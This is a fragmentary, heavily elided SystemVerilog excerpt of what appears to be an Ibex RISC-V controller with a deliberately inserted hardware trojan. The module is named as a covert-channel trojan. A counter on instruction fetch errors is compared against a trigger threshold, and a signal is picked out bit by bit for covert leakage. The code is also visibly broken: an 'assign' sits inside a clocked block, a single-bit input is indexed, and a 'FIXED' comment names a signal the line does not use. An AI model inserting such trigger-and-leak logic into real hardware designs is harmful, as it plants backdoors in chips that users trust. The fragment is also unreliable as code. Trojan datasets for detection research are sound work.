...
module ibex_controller_trojan_Covert #(
  ...
  output logic                  perf_tbranch_o           // we are executing a taken branch
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24653;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (instr_fetch_err_i && |ctrl_busy_o) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = instr_fetch_err_i[covert_bit_index];  // <-- FIXED: use trigger_signal
